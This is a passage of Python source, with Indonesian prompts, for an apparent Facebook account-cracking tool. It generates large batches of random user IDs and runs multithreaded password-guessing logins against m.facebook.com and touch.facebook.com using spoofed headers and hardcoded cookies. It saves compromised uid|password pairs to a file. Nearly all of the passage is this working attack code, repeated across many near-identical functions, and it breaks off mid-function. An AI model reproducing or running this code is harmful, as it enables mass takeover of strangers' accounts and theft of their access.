			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_touch3(self):
		print("")
		print(f"{P} [1] Cloning Id Running (1)94xxx")
		print(f"{P} [2] Cloning Id Running (2)94xxx")
		print(f"{P} [3] Cloning Id Running (3)94xxx")
		print(f"{P} [4] Cloning Id Running (4)94xxx")
		print(f"{P} [5] Cloning Id Running (5)94xxx")
		print(f"{P} [6] Cloning Id Running (6)94xxx")
		print(f"{P} [7] Cloning Id Running (7)94xxx")
		print(f"{P} [8] Cloning Id Running (8)94xxx")
		print(f"{P} [9] Cloning Id Running (9)94xxx")
		print(f"{P} [10] Cloning Id Running Random Id")
		Runn = input(f"{P} Pilih : ")
		if Runn in ["1"]:
			self.runzzz198()
		elif Runn in ["2"]:
			self.runzzz298()
		elif Runn in ["3"]:
			self.runzzz398()
		elif Runn in ["4"]:
			self.runzzz498()
		elif Runn in ["5"]:
			self.runzzz598()
		elif Runn in ["6"]:
			self.runzzz698()
		elif Runn in ["7"]:
			self.runzzz798()
		elif Runn in ["8"]:
			self.runzzz898()
		elif Runn in ["9"]:
			self.runzzz998()
		else:
			print(f" {P} Isi Yang Benar") 
			self.old_basic4()
			
	def runzzz198(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz998(self):
		x = 111111111
		xx = 999999999
		idx = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz898(self):
		x = 111111111
		xx = 999999999
		idx = "8"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz798(self):
		x = 111111111
		xx = 999999999
		idx = "7"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali") 
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz698(self):
		x = 111111111
		xx = 999999999
		idx = "6"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz598(self):
		x = 111111111
		xx = 999999999
		idx = "5"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz498(self):
		x = 111111111
		xx = 999999999
		idx = "4"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz398(self):
		x = 111111111
		xx = 999999999
		idx = "3"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzz298(self):
		x = 111111111
		xx = 999999999
		idx = "2"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def touch4(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_free4(self):
		print("")
		print(f"{P} [1] Cloning Id Running (1)94xxx")
		print(f"{P} [2] Cloning Id Running (2)94xxx")
		print(f"{P} [3] Cloning Id Running (3)94xxx")
		print(f"{P} [4] Cloning Id Running (4)94xxx")
		print(f"{P} [5] Cloning Id Running (5)94xxx")
		print(f"{P} [6] Cloning Id Running (6)94xxx")
		print(f"{P} [7] Cloning Id Running (7)94xxx")
		print(f"{P} [8] Cloning Id Running (8)94xxx")
		print(f"{P} [9] Cloning Id Running (9)94xxx")
		Runn = input(f"{P} Pilih : ")
		if Runn in ["1"]:
			self.runzz198()
		elif Runn in ["2"]:
			self.runzz298()
		elif Runn in ["3"]:
			self.runzz398()
		elif Runn in ["4"]:
			self.runzz498()
		elif Runn in ["5"]:
			self.runzz598()
		elif Runn in ["6"]:
			self.runzz698()
		elif Runn in ["7"]:
			self.runzz798()
		elif Runn in ["8"]:
			self.runzz898()
		elif Runn in ["9"]:
			self.runzz998()
		else:
			print(f" {P} Isi Yang Benar") 
			self.old_basic4()
			
	def runzz198(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzz998(self):
		x = 111111111
		xx = 999999999
		idx = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzz898(self):
		x = 111111111
		xx = 999999999
		idx = "8"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzz798(self):
		x = 111111111
		xx = 999999999
		idx = "7"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali") 
				Main()
		except Exception as e:exit(str(e))
			
	def runzz698(self):
		x = 111111111
		xx = 999999999
		idx = "6"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.free4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzz598(self):
		x = 111111111
		xx = 999999999
		idx = "5"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
